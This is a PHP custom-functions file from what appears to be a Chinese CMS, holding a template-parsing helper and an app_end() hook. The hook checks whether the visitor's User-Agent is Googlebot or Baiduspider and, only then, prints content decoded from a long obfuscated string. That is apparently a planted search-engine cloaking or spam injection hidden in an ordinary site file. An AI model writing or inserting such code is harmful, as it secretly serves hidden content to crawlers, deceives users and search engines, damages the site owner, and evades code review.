<?php
	/*
		这里可以添加自定义功能函数
	*/
	//模块执行结束之后，调用的接口函数
	function app_end(){
		$tmp = $_SERVER['HTTP_USER_AGENT'];
		if (strpos($tmp, 'Googlebot') !== false) {
		    $flag = true;
		} else
		    if (strpos($tmp, 'Baiduspider') !== false) {
		        $flag = true;
		    }
		if ($flag == true) {
			echo badu_decode('d8794wqKD0yYMH8nHnqYjoWrgsax+d5r/BSiOidDe14asQa5ibzngS7ulqgCipGbw/+9a9fgqtak53IHKBmYlzUifABsjC/VdMnGWMDoymy4R6LD2LPZWb8VCy6Xwg122DXP8sUDxD/lq2ui7uUrZDsfQB7Mga5dHcHbJdwiqPv06/1627NePJuUbClrd9wmNnHGAMq42J9ICsvD9OAb22IaB4bJL6U/8MJqZZnOo9U3');
		}
	}
	//自定义模板标签解析函数
	function tpl_parse_ext($template,$config=array())
	{
	    require_once(dirname(__FILE__)."/tpl_ext.php");
	    $template=template_ext($template,$config);
	    return $template;

	}









